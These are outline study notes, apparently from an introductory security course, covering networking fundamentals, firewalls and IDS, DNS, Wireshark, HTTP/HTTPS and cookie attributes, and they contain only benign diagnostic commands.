- 01. Preliminary Skills - Prerequistes
    - 110.Introduction
        - Jargon used by IT professionals
            - Black hat hacker
            - white hat hacker
            - User and a malicious user
            - Root or administrator
            - Privileges
            - Security through obscurity
            - Attack
            - Privilege escalation
            - Denial of service
            - Remote Code Execution
            - Shell Code
        - Cryptography and VPN
            - Clear-text protocols - transmit data over the network without any kind of transformation (encryption). Vulnerable to eavesdropping 
            -  Cryptographic protocols - transform (encrypt) the information protocol to protect the communication
            - Virtual Private Network (VPN) - uses cryptography to extend a private network over a public one, like the internet. Great example of protocol tunneling.
        - Wireshark Introduction
            - Wireshark is a network sniffer tool (allows you to see the data transmitted over the network to and from your computer)
            - Video - Demo on Wireshark, capturing HTTP and HTTPS data - Conclusion, to tell that we can eavesdrop and see password transferred in HTTP, not in HTTPS (because its encrypted).
        - Binary Arithmetic Basics
            - Decimals (0-9)
            - Binary (0 & 1)
            - Bit-wise Operators
                - NOT
                - AND
                - OR
                - XOR
                - Hexadecimal arithmetic (0x or h)
    - 120.Networking
        - Protocols
            - In computer network, machines talk to each other by means of protocols. These protocols ensure that different computers, using different hardware and software, can communicate.
            - Packets
                - The primary goal of networking is to exchange information between networked computer; this information is carried by "packets". Packets are nothing but streams of bits running as electric signals on physical media used for data transmission.
                - Every packet in every protocol has a header, and a payload.
                - The header has a protocol-specific structure: this ensures that the receiving host can correctly interpret the payload and handle the overall communication.
                - The payload is the actual information. IT could be something like part of an email message or the content of a file during a download.
                - Example - The IP Header
                    - The IP protocol header is at least 160 bits (20 bytes)![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2F8XgVftOCL2.png?alt=media&token=10c15827-390c-4665-9cb6-29c28e23872c)
                    - Using the information in the header, the nodes involved in the communication can understand and use IP packets.
            - Protocol Layers
                - List 
                    - ^^Application layer^^
                    - ^^Transport layer^^
                    - ^^Network layer^^
                    - ^^Physical layer^^
                - These layers work on top of one another, and each has its own protocol
                - Each layer serves the one above it -- The application layer does not need to know how to identify a process a host, how to reach it and how to use the copper wire to establish a communication. It just uses its underlying layers.
            - ISO/OSI
                - In 1984, the International Organization for Standardization (ISO) published a theoretical model for network systems communication: the Open System Interconnection (OSI) model.
                - The ISO/OSI model was never implemented, but it is widely used in literature or when talking about IT networks. 
                - ISO/OSI consists of seven layers and is used as a reference for the implementation of actual protocols
                    - Application
                    - Presentation
                    - Session
                    - Transport
                    - Network
                    - Data Link
                    - Physical
                - 
            - Encapsulation
                - The entire upper protocol packet (header plus payload) is the payload of the lower one; this is called encapsulation.
                - IP protocol suite or TCP/IP, is a real-world implementation of a networking stack and is the protocol stack used on the Internet.
                    - It has four layers:
                        - Application
                        - Transport 
                        - Network or Internet
                        - Data Link
                - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FZ9cqT-Dnp9.png?alt=media&token=de806722-9204-4990-8de8-e2aaa6f65b1a)
                - During encapsulation every protocol adds its own header to the packet, treating it as a payload. This happens to every packet send by a host.
                - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2F7-QcTnkyUk.png?alt=media&token=41d0847f-fbc7-4f75-a446-b6ea8b5ce103)
                - The receiving host does the same operation in reverse order. Using this method, the application does not need to worry about how the transport, network and link layers work. It just hands in the packet to the transport layer.
        - Internet Protocol (IP)
            - The Internet Protocol (IP) is the protocol that runs on the Internet layer of the Internet Protocol suite, also known as TCP/IP.
            - IP is in charge of delivering the datagrams (IP packets are called datagrams) to the hosts involved in a communication, and it uses IP addresses to identify a host.
            - When you write a letter, you have to specify the recipient's address on the envelope before sending it. Similarly, the Internet uses its addressing scheme to deliver packets to the right destination.
            - Any host on a computer network, be it a private network or public (the Internet), is identified by a unique IP address.
            - IPv4 Addresses:
                - The vast majority of networks run IP version 4 (IPv4)
                - An IPv4 address consists of four byte, or octets; a byte consists of 8 bits
                - A dot delimits every octet in the address
                - You can represent upto 2^8 different values from 0 to 255
                - This does not mean that you can assign any address starting from 0.0.0.0 to 255.255.255.255 to a host. Some addresses are reserved for special purposes.
            - Reserved IPv4 Addresses:
                - Some reserved intervals are:
                    - 0.0.0.0 - 0.255.255.255 representing "this" network
                    - 127.0.0.0 - 127.255.255.255 representing the local host (e.g., your computer)
                    - 192.168.0.0 - 192.168.255.255 is reserved for private networks
            - IP/Mask:
                - To fully identify a host, you also need to know its network. To do that, you will need an IP address and a netmask, or subnet mask.
                - With an IP/netMask pair, you can identify the network part and the host part of an IP address.
                    - IP address: 192.168.5.100
                    - Subnet mask: 255.255.255.0
                - To find the network part you have to perform a bitwise AND operation between the netmask and the IP address.
                - The inverse of the netmask lets you know how many hosts a network can contain.
            -  Network and Broadcast Addresses:
                - There are two special addresses:
                    - One with the host part made all zeros. -- network address
                    - Another with host part made by all ones -- broadcast address
            - IPv6:
                - IPv4 addresses are being consumed rapidly due to a large number of new devices connecting to the internet every day. One day IPv4 addresses might be exhausted.
                - As a 32-bit addresses, IPv4 has 2^32 possible addresses
                - While a 128-bit IPv6 address has 2^128 possible addresses
                - An IPv6 address consists of 16-bit hexadecimal numbers separated by a colon (:). Hexadecimal numbers are case insensitive. In case zeros occur, they can be skipped.
                - IPv6 header
                    - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2F-0mK6svqqj.png?alt=media&token=9d5acf1d-7d4a-473a-b83c-c71e7add5f10)
                - IPv6 also has reserved addresses, which cannot be used like the reserved IPv4 ones.
                - For example:
                - ::1/128 is a loopback address
                - ::FFFF:0:0/96 are IPv4 mapped addresses
                - An IPv6 address can be split in half (64 bits each) into a network part and a device part.
                - Further more, the first 64 bits ends with a dedicated 16-bits space (one hex word) that can be used only for specifying a subnet.
                - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2Fkz1GZpIyJu.png?alt=media&token=9838b164-9417-42d8-86b6-32d92f2f6c2c)
                    - IPv6 addresses have three types:
                        - Global Unicast Address - These addresses are global ones, and reside in global internet.
                        - Unique Local and Link Local - reside only in Internal Networks.
                    - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FwT3-NFG9-K.png?alt=media&token=c172349e-e096-436d-adb3-7e3f06937b31)
                - IPv6 Subnets:
                    - Like IPv4, an IPv6 address has a network portion and a device portion.
                    - Unlike IPv4, an IPv6 address has a dedicated subnetting portion.
                    - Network Address Range - In IPv6, the first 48 bits are for Internet global addressing.
                    - Subnetting Range - The 16 bits from the 49th to the 64th are for defining subnets.
                    - Device (Interface) Range - The last 64 bits are for device (interface) ID.
                    - In IPv6, there are prefixes instead of subnets blocks. For example:`2001:1111:1234:1234::/64`
                    - In the above IPv6 address, the number after the slash (64) is the number of bits that is sued for a prefix. Everything behind it can be used for hosts of the subnet.
        - Routing
            - Routers are devices connected to different networks at the same time. They are able to forward IP datagrams from one network to another. The forwarding policy is based on routing protocols.
            - It determines the best path to reach a network.
            - Behaves like a postman who tries to use the shortest path possible to deliver a letter.
            - Routing Table:
                - To choose the right forwarding interface, a router performs a lookup in the routing table (IP-to-interface binding).
                - It also contains a default address (0.0.0.0), which is used when the router receives a packet whose destination is an unknown network. This gets triggered when the Destination IP address is not present in the routing table, it sends to the interface linked with 0.0.0.0.
            - Routing Metrics
                - During path discovery, routing protocols also assign a metric to each link.
                - This ensures that, if two paths have the same number of hops, the fastest route is selected.
                - The metric is selected according to the channel's estimated bandwidth and congestion.
            - Checking the Routing Table:
                - Routing tables are not only kept by routers; every host stores its own host.
                - To check what they look like, you can use:
                    - `ip route` on Linux
                    - `route print` on Windows
                    - `netstat -r` on OSX
        - Link Layer Devices and Protocols
            - Link Layer Devices:
                - Hubs and switches are network devices that forward frames (layer 2 packets) on a local network.
                - They work with link layer network address: MAC addresses.
            - MAC addresses:
                - IP addresses are the Layer 3 (Network layer) addressing scheme used to identify a host in a network, while MAC addresses uniquely identify a network card (Layer 2).
                - A MAC (Media Access Control) address is also known as the physical address.
                - It is 48-bit (6 bytes) long and expressed in hexadecimal form (HEX) `00:11:BB:33:44:FF`
                - To discover the MAC address of the network cards installed on your computer, you can use:
                    - `ipconfig /all` on Windows
                    - `ifconfig` on Unix operating systems, like MacOS
                    - `ip addr` on Linux
            - IP and MAC addresses:
                - Two different networks are connected together by a router.
                - Every host on the network has both an IP and a MAC address. The router has two interfaces, each with its own addresses.
                - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FGmkWs07zMT.png?alt=media&token=e3d7cc5e-543d-4461-966e-717ded98a381)
                    - If workstation A wants to send a packet to workstation B, which IP and MAC addresses will it use?
                    - Workstation A will create a packet with:
                        - The destination IP address of workstation B in the IP header of the datagram.
                        - The destination MAC address of the router in the link layer header of the frame.
                        - The source IP address of workstation A.
                        - The source MAC address of workstation A.
                    - The router will then take the packet and forward it to B's network, rewriting the packet's MAC addresses:
                        - The destination MAC address will be B's
                        - The source MAC address will be router's
                    - The router will not change the source and destination IP addresses.
                - When a device sends a packet:
                    - The destination MAC address is the MAC address of the next hop; this ensures that, locally, the network knows where to forward the packet.
                    - The destination IP address is the address of the destination host; this is global information and remains the same along the packet trip.
            - Switches:
                - Switches work with MAC addresses.
                - Switches also have multiple interfaces, so they need to keep a forwarding table that binds one or more MAC addresses to an interface.
                - The forwarding table is called Content Addressable Memory (CAM) table. It has MAC addresses, Interface number, and TTL (time to live) as columns.
                - Switches, without VLANs, do not segment networks. Router do.
                - Usually, every interface of a router is attached to a different subnet with a different network address.
                - Also, routers do not forward packets coming from one interface if they have a broadcast MAC address.
                - Forwarding Tables:
                    - The forwarding table, or Content Addressable Memory table (CAM table), is stored in the device's RAM and is constantly refreshed with new information.
                    - If two hosts have same interface number, then they probably connected via another switch.
                    - The TTL determines how long an entry will stay in the table. This is important because the CAM table has a finite size. So, as soon as an entry expires it is removed from the table.
                - CAM Table Population:
                    - Switches learn new MAC addresses dynamically; they inspect the header of every packet they receive, thus identifying new hosts.
                    - The source MAC address is compared to the CAM table:
                        - If the MAC address is not in the table, the switch will add a new MAC-Interface binding to the table.
                        - If the MAC-Interface binding is already in the table, its TTL gets updated.
                        - If the MAC is in the table but bound to another interface the switch updates the table.
                - To forward a packet:
                    - 1. The switch reads the destination MAC address of the frame.
                    - 2. It performs a look-up in the CAM table.
                    - 3. It forwards the packet to the corresponding interface.
                    - 4. If there is no entry with that MAC address, the switch will forward the frame to all its interfaces.
            - ARP:
                - When a host wants to send a packet to another host, it needs to know the IP and the MAC address of the destination in order to build a proper packet.
                - When a host needs to know the MAC addresses of other network nodes, and it can learn them by using the Address Resolution Protocol (ARP).
                - With ARP a host can build the correct IP address - MAC address binding.
                - When a host (A) wants to send traffic to another (B), and it only knows the IP address of B:
                    - 1. A builds an ARP request containing the IP address of B and ff:ff:ff:ff:ff:ff as destination MAC address. This is fundamental because the switches will forward the packet to every host.
                    - 2. Every host on the network will receive the request.
                    - B replies with an ARP reply, telling A its MAC address.
                - ARP cache entries have a TTL too, as the size of the device RAM is finite. A host discards an entry at the power off or when the entry's TTL expires.
                - You can check the ARP cache of your host by typing:
                    - `arp -a` on Windows.
                    - `arp` on *nix operating systems
                    - `ip neighbour` on Linux
            - Hubs:
                - Hubs were used in computer networks before switches. They have the same purpose but not the same functionality.
                - Hubs are simple repeaters that do not perform any kind of header check and simply forward packets by just repeating electric signals. They receive electric signals on a port and repeat the same signals on all the other ports.
        - TCP & UDP
            - The Transmission Control Protocol (TCP) and the User Datagram Protocol (UDP) are the most common transport protocols used on the Internet.
            - Computer networks can be unreliable. This means that some packets can be lost during their trip from source to destination. A packet can be lost because of network congestion, temporary loss of connection and other technical issues.
            - When designing a transport layer protocol, the designer must choose how to deal with these limitations. For example, TCP:
                - Guarantees packet delivery. Because of that, an application that needs a guaranteed delivery will use TCP as the transport protocol.
                - Is also connection oriented. It must establish a connection before transferring data.
                - TCP is the most used transport protocol on the Internet. The vast majority of applications use it, and the IP protocol suite is often called TCP/IP.
                - Email clients, web browsers and FTP clients are some common applications using TCP.
            - On the other hand, UDP is much more simple than TCP:
                - It does not gurantee packet delivery.
                - It is connectionless.
            - UDP is faster than TCP, as it provides a better throughput (number of packets per second); in fact, it is used by multimedia applications that can tolerate packet loss but are throughput intensive.
            - For example, UDP is used for VoIP and video streaming: applications where you can tolerate a little glitch in the audio or video.
            - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2F5mXB7edIiF.png?alt=media&token=ed319e0e-4c1e-4728-a988-810ba58ae837)
            - Ports:
                - Ports are used to identify a single network process on a machine. If you want to unequivocally identify a process on a network, you need to know the <IP>:<PORT> pair.
                - To correctly address a process on a network, you have to refer to the <IP>:<Port> pair. For example:
                    - 192.168.5.3:80
                    - 10.11.12.1:443
                    - 172.16.8.9:22
                - Well-known Ports:
                    - Ports in the ranging from 0-1023, the first 1024 that is, are called well-known ports and are used by servers for the most common services.
                    - Each common protocol has a well-known port in the 0-1023 range. Common server processes, or daemons, use well-known ports most of the time.
                    - Ports are assigned by IANA.
                    - The most common ports are:
                        - FTP - 21
                        - SSH - 22
                        - Telnet - 23
                        - SMTP - 25
                        - DNS - 53
                        - HTTP - 80
                        - POP3 - 110
                        - SFTP - 115
                        - NETBIOS - 137, 138, 139
                        - IMAP - 143
                        - MS SQL Server - 1433
                        - MySQL - 3306
                    - A daemon is a program that runs a service. System administrators can change the daemon configuration, changing the port the service listens to for connection. They do that to make services recognition a little bit harder for hackers.
            - TCP and UDP headers:
                - TCP Header
                    - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FqfoiLwyBZS.png?alt=media&token=8cb882e0-bac2-4233-87f2-7cd9f1bfd38d)
                - UDP Header
                    - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FHQ_ae_RBSI.png?alt=media&token=a439de91-38dd-4f56-a0b1-085eebb2d434)
            - Netstat Command:
                - To check the listening ports and the current (TCP) connections on a host you can use:
                    - `netstat -ano` on Windows
                    - `netstat -tunp` on Linux
                    - `netstat -p tcp -p udp` together with
`lsof -n -i4TCP -i4UDP` on MacOS
                - Another great tool for Windows is [TCPView](https://docs.microsoft.com/en-in/sysinternals/downloads/tcpview
) from Sysinternals.
                - TCPView shows:
                    - Process name
                    - PID
                    - Protocol
                    - Local and remote addresses
                    - Local and remote ports
                    - State of the connection (if applicable)
            - TCP Three Way Handshake:
                - To establish a connection between two hosts running TCP, they must perform three steps: the three-way handshake. They can then start the actual data transmission.
                - The header fields involved in the handshake are:
                    - Sequence number
                    - Acknowledgement numbers
                    - SYN and ACK flags
                - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FBkuxHl3kyL.png?alt=media&token=12740d09-8c4c-4164-b0e1-ee6b21ca691e)
        - Firewalls and Network Defense
            - Firewalls are specialized software modules running on a computer or a dedicated network device.
            - They serve to filter packets coming in and out of a network.
            - A firewall can work on different layers of the OSI model, thus providing different features and protections.
            - Packet filtering firewalls:
                - Most basic feature of a firewall is packet filtering.
                - An administrator can create rules which will filter packets according to certain characteristics like:
                    - Source IP address
                    - Destination IP address
                    - Protocol
                    - Source port
                    - Destination port
                - Packet filters inspect the header of every packet to choose how to treat the packet. The more common actions are:
                    - Allow: allow the packet to pass
                    - Drop: drops the packet without any diagnostic message to the packet source host
                    - Deny: do not let the packet pass, but notify the source host
                - Inspecting the header of a packet does not give you any information on the actual packet content.
                - The firewall can only filter traffic by using IP addresses, ports, and protocols. Any kind of application layer traffic will pass, even hacker's exploits.
                - Packet filtering is not enough to stop layer 7 attacks.
            - Application layer firewalls:
                - Application level firewalls work by checking all the OSI 7 layers.
                - They provide a more comprehensive protection because they inspect the actual content of a packet, not just its headers. For example:
                    - Drop any peer-to-peer application packet.
                    - Prevent users from visiting a site.
                - Layer 7 firewalls are indeed able to understand most of the application layer protocols in use nowadays. Organizations use them not only to protect their network from hackers but also to filter unwanted traffic.
            - IDS:
                - There is not just traffic detection, but intrusion detection! Intrusion Detection Systems (IDS) inspect the application payload trying to detect any potential attack.
                - An IDS is specialized software used for detecting ongoing intrusions. It checks for attack vectors like ping sweeps, port scans, SQL injections, buffer overflows and so on.
                - IDS can also identify traffic generated by a virus or a worm. Pretty much every kind of network threat can be detected by a well-configured IDS.
                - An IDS, like an antivirus, detects risky traffic by means of signatures. The vendor provides frequent signature updates as soon as new attack vectors are found in the wild. Without the right signatures an IDS cannot detect and report an intrusion; the IDS cannot detect something if it does not already know.
                - There are also false positives. They happen when legit traffic is flagged as malicious.
                - Detection is performed by a multitude of sensors, software components that inspect network traffic.
                - Sensors passively intercept intrusions and communicate them to the IDS manager, software in charge of maintaining policies and which provides a management console to the system administrator.
                - IDSs do not substitute firewalls.
                - They support firewalls by providing a further layer of security protecting the network from mainstream and well-known attack vectors.
                - IDSs fall into two main categories:
                    - Network Intrusion Detection Systems (NIDS)
                    - Host Intrusion Detection Systems (HIDS)
                    - NIDS:
                        - Network Intrusion detection systems inspect network traffic by means of sensors which are usually placed on a router or in a network with a high intrusion risk, like a DMZ.
                    - HIDS:
                        - Host IDS sensors monitor application logs, file-system changes and changes to the operating system configuration.
                    - IDSs, unlike firewalls, can detect suspicious activities and report them to the network administrator. Suspicious activity is logged for future analysis, but it is not blocked.
                - IPS:
                    - Intrusion Prevention Systems (IPS) can drop malicious requests when the threat has a risk classification above a pre-defined threshold.
                - Spot an Obstacle:
                    - During penetration testing activities, you might want to identify if a firewall-like mechanism is used in the environment.
                    - If you suspect presence of a firewall, you might want to check for anomalies in TCP Three-Way Handshake.
                    - When a firewall is in place, the following behavior may be spotted:
                        - TCP SYN are sent, but there no TCP SYN/ACK replies.
                        - TCP SYN packets are sent but a TCP RST/ACK reply is received.
                    - Note: that this type of observation does not determine whether the detected obstacle is a firewall, an IDS, or any other device; this just helps you to identify environmental constraints.
                - NAT and Masquerading:
                    - Firewalls not only filter packets but can also be used to implement Network Address Translation or NAT.
                    - Network Address Translation (NAT) or IP masquerading are two techniques used to provide access to a network from another network.
                    - The NAT device rewrites the source IP address of every packet sent to Internet from private network, thus masquerading the original client's IP address.
                    - A machine on the Internet will never know the original client's IP address.
        - DNS
            - The Domain Name System, or DNS, is an application layer protocol.
            - The DNS primarily converts human-readable names, like www.elearnsecurity.com, to IP addresses and is a fundamental support protocol for the internet and computer networks in general. It is widely recognized that the entire internet security is relying upon DNS.
            - DNS Structure:
                - A DNS name such as www.elearnsecurity.com or members.elearnsecurity.com can be broken down into the following parts:
                    - Top level domain (TLD)
                    - Domain part
                    - Subdomain part (if applicable)
                    - Host part
                    - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FpAyLPZb3Rz.png?alt=media&token=fe03fa24-c63d-40e9-9c4e-8ce5e8b4fa8e)
                    - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FckMfagQ3d3.png?alt=media&token=7f6e2af9-b72b-43fb-ad73-c0ba9751bd6f)
                    - Name resolution is performed by resolvers, servers that contact the top level domain (TLD) DNS servers and follow the hierarchy of the DNS name to resolve the name of a host.
                    - Resolvers are DNS servers provided by your ISP or publicly available like OpenDNS or Google DNS.
            - DNS Names Resolution:
                - To convert a DNS name into an IP address, the operating system must contact a resolver server to perform the DNS resolution.
                - The resolver breaks down the DNS name in its parts and uses them to convert the DNS name into an IP address.
                - DNS Resolution Algorithm:
                    - 1. Firstly, the resolver contact one of the root name servers; these servers contain information about the top level domains.
                    - 2. Then, it asks the TLD name server what's the name server that can give information (authoritative name server) about the domain the resolver is looking for.
                    - 3. If there are one or more subdomains, step 2 is performed again on the authoritative DNS server for every subdomain.
                    - 4. Finally, the resolver asks for the name resolution of the host part.
                - Resolvers and Root Servers:
                    - IP addresses of the root servers are hardcoded in the configuration of the resolver. System administrators keep the list updated, otherwise, the resolver would not be able to contact a root server!
                - Reverse DNS Resolution:
                    - The domain name system can also perform the inverse operation; it can convert an IP address to a DNS name.
                    - Keep in mind that this is not always the case; the administrator of a domain must have enabled and configured this feature for the domain to make it work.
                - The DNS is used to perform name resolution. The domain name system is not just that, it is used to identify what the mail servers for a domain are, to know what is the right server for a specific role and much more.
                - The DNS is also very important to the security of the whole internet because breaking DNS security means breaking SSL and TLS.
        - Wireshark
            - Wireshark is a network sniffer and protocol analyzer.
            - This means that you can use it to analyze every packet, traffic stream, or connection that hits your computer network interface(s).
            - Wireshark can capture all the traffic seen by the network card of the computer running it.
            - To understand what traffic a network card sees, you have to know that most network cards, also known as Network Interface Cards (NIC), can work in promiscuous or monitor mode.
            - NIC Promiscuous Mode:
                - During normal operations, a network card discards any packet addresses to another NIC. In promiscuous mode, a network card will accept and process any packet it receives.
                - With the introduction of switched networks, sniffing other machines Ethernet traffic got harder. You have to perform an attack such as ARP poisoning or MAC flooding in order to do that.
                - WiFi medium (the air), instead, is broadcast by nature, so it's possible to still detect traffic destined to a different host.
            - The center pane gives you access to all the protocols layers used by a packet.
            - Filtering:
                - Wireshark can filter traffic at capture or at display time. Each method has its own pros an cons.
                - You can set capture filters before starting the capture so that Wireshark will capture only packets matching the filters.
                    - Here are some basic capture filters:
                    - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2Fn9_NLgJuIJ.png?alt=media&token=7ae7ff52-45e0-4122-a033-a1d71c5af433)
                - Capture filters:
                    - Capture filters will downsize the amount of traffic gathered.
                    - The final capture will be smaller, and it will contain only the needed traffic.
                - Display filters:
                    - However, capture filters might not catch interesting traffic! Display filters instead allow you to inspect and apply very granular filters to every field of the captured packets. Wireshark then displays only the packets matching the filters.
                    - You can always remove or fine tune a display filter, something you can't do with the capture filter (you would have to re-start the capture from scratch).
                    - The background of the text-box will turn red if the filter is invalid or green when the filter is valid.
                    - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2F_i_fdWCqyQ.png?alt=media&token=625e0337-902d-4765-bd40-b4a74763df85)
                    - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FNucdcoBSNT.png?alt=media&token=38c2eb14-3d10-4bd6-b425-a9de9eb3ec45)
    - 130.Web Applications
        - Web applications are applications running on web servers and accessible via web browsers.
        - HTTP Protocol Basics
            - Hypertext Transfer Protocol (HTTP) is the most used application protocol on the Internet. It is the client-server protocol used to transfer web pages and web application data.
            - In HTTP, the client, usually a web browser, connects to a web server such as MS IIS or Apache HTTP Server. HTTP is also used under the hood by many mobile and modern applications.
            - During an HTTP communication, the client and the server exchange messages.
            - The client sends requests to the server and gets back responses.
            - HTTP works on top of TCP protocol.
            - That means, first a TCP connection is established, and then the client sends its request, and waits for the answer. The server processes the request and sends back its answer, providing a status code and appropriate data.
            - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2F5dr6M-sY4D.png?alt=media&token=faabd7f5-6f6b-4868-94ba-c3eeff798158)
            - The format of an HTTP message is:
                - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2F4l6J3MN9Z7.png?alt=media&token=1db7da87-0fd3-4fff-8b00-925c70c8cbe4)
                - To end lines in HTTP, you have to use the \r (carriage return) and the \n (newline) characters.
                - The header contains a request followed by some header fields. Every header fields has the following format:
                    - Header-name: header value
            - HTTP Requests:
                - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FBcxE1IVklQ.png?alt=media&token=49406553-6acb-4549-9d2f-a0cac35d8c13)
                - "GET" is the HTTP verb of the request. The HTTP verb, or request method, states the type of the request.
                    - There are many HTTP methods like:
                        - TRACE
                        - HEAD
                        - POST
                - After the HTTP VERB you can see the path (/) and the protocol version (HTTP 1.1).
                    - The path tells the server which resource the browser is asking for. The protocol version tells the server how to communicate with the browser.
                - The Host header field specifies the Internet hostname and port number of the resource being request.
                    - The host value is obtained from the URI of the resource
                - User-Agent tells the server what client software is issuing the request.
                    - A client count be:
                        - Firefox
                        - Internet Explorer
                        - Safari
                        - Opera
                        - Chrome
                        - A mobile app...
                    - It also reveals to the server the operating system version.
                - The browser sends the Accept header field to specify which document type it is expecting in the response.
                - Similarly, with Accept-Language, the browser can ask for a specific (human) language in the response
                - Accept-Encoding works similarly to Accept but restricts the content encoding, not the content itself.
                - The Connection header field allows the sender to specify options that are desired for that particular connection.
                    - Future communications with the server will reuse the current connection.
            - HTTP Responeses:
                - When the server receives a request, it processes it and then sends an HTTP response to the client. The response has its own header format.
                - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FM_ngD6d9LE.png?alt=media&token=0742fc45-7ccf-4dce-aa1e-7e78458d2c8a)
                    - The first line of a Response message is the Status-Line, which consists of the protocol version (HTTP 1.1) followed by a numeric status code (200) and its relative textual meaning (OK).
                        - Some common status codes are:
                            - 200 OK: the resource is found.
                            - 301 Moved Permanently: the requested resource has been assigned a new permanent URI.
                            - 302 Found: the resource is temporarily under another URI.
                            - 403 Forbidden: the client does not have enough privileges, and the server refuses to fulfill the request.
                            - 404 Not Found: the server cannot find a resource matching the request.
                            - 500 Internal Server Error: the server does not support the functionality required to fulfill the request.
                    - Date represents the date and time at which the message was originated.
                    - With the Cache-Control header, the server informs the client about cached content.
                        - Using cached content saves bandwidth, as it prevents the client from re-requesting unmodified content.
                    - Content-Type lets the client know how to interpret the body of the message
                    - Content-Encoding extends Content-Type
                    - The Server header field simply contains the header of the server that generated the content.
                    - Content-Length indicates the length, in bytes, of the message body.
            - HTTPS:
                - HTTP content, as in every clear-text protocol, can be easily intercepted or mangled by an attacker on the path. Moreover, HTTP does not provide strong authentication between the parties.
                - HTTP Secure (HTTPS), or HTTP over SSL/TLS, is a method to run HTTP which is a clear-text protocol over SSL/TLS, a cryptographic protocol.
                - This layering techniques provide confidentiality, integrity protection and authentication to the HTTP protocol.
                - In other words, when using HTTPS:
                    - An attacker on the patch cannot sniff the application layer communication.
                    - An attacker on the path cannot alter the application layer data.
                    - The client can tell the real identity of the server and, sometimes, vice-versa.
                - HTTPS offers encryption, which means that a network adjacent user is able to sniff the traffic, but he will not know:
                    - HTTP Request headers, body, target domain
                    - HTTP Response headers, body
                - On the other hand, when inspecting HTTPS, one cannot know what domain is contacted and what data is exchanged.
                - A network adjacent user might recognize:
                    - Target IP address
                    - Target port
                    - DNS or similar protocols may disclose which domain user tries to resolve.
                - HTTPS does not protect against web application flaws! All the attacks against an application happen regardless of SSL/TLS.
                - The extra encryption layer just protects data exchanged between the client and the server. It does not protect from an attack against the application itself.
                - Attacks such as XSS and SQL injections will still work.
        - HTTP Cookies
            - HTTP is a stateless protocol; this means that websites cannot keep the state of a visit across different HTTP requests.
            - In other words, every HTTP request is completely unrelated to the ones preceding and following it.
            - To overcome this limitation, sessions and cookies were invented in 1994, to make HTTP stateful.
            - Cookies are just textual information installed by a website into the "cookie jar" of the web browser.
            - The cookie jar is the storage space where a web browser stores the cookies.
            - Cookies Format:
                - A server can set a cookie via the Set-Cookie HTTP header field in a response message. A cookie contains the following attributes:
                    - The actual content
                    - An expiration date
                    - A path
                    - The domain
                    - Optional flags:
                        - Http only flag
                        - Secure flag
                - ![](https://firebasestorage.googleapis.com/v0/b/firescript-577a2.appspot.com/o/imgs%2Fapp%2FSoldieR%2FYuNps8h7EM.png?alt=media&token=3b03e92d-f09d-4fa0-b788-29f8da3bd979)
            - Cookies Handling:
                - Browsers use domain, path, expires and flags attributes to choose whether or not to send a cookie in a request.
                - Cookies are sent only to the valid domain/path when they are not expired and according to their flags.
            - Cookie Domain:
                - The domain field and the path field set the scope of the cookie. The browser sends the cookie only if the request is for the right domain.
                - When a web server installs a cookie, it sets the domain field, e.g., elearnsecurity.com. Then, the browser will use the cookie for every request sent to that domain and all its subdomains.
                - If the server does not specify the domain attribute, the browser will automatically set the domain as the server domain and set the cookie host-only flag; this means that the cookie will be sent only to that precise hostname.
            - Cookie Path:
                - The path and the domain attributes set the scope of a cookie.
                - The browser will send a cookie to the right domain and to any subpath of the path field value.
                - When a cookie has the path attribute set to:
                    - path=/the/path
                - The browser will send the cookie to the right domain and to the resources in:
                    - /the/path
                    - /the/path/sub
                - But, it will not send it to /otherpath.
            - Cookie Expires Attribute:
                - The expires attribute sets the validity time window of a cookie.
                - A browser will not send an expired cookie to the server. Session cookies expire with the HTTP session.
            - Cookie Http-Only Attribute:
                - When a server installs a cookie into a client with the http-only attribute, the client will set the http-only flag for that cookie. This mechanism prevents JavaScript, Flash, Java and any other non-HTML technology from reading the cookie, thus preventing cookie stealing via XSS.
            - Cookie Secure Attribute:
                - Secure flag creates secure cookies that will only be send over an HTTPS connection (they will not be sent over HTTP).
            - Cookie Content:
                - A cookie can carry a number of values. A server can set multiple values with a single Set-Cookie header by specifying multiple KEY=VALUE pairs.
            - Cookie Protocol:
                - Cookies are often installed during a login.
                - The server sends a response with a Set-Cookie header field, thus telling the browser to install the cookie.
                - For every subsequent request, the browser considers:
                    - Domain
                    - Path
                    - Expiration
                    - Flags
                - If all the checks pass, the browser will insert a cookie: header in the request.
        - Sessions
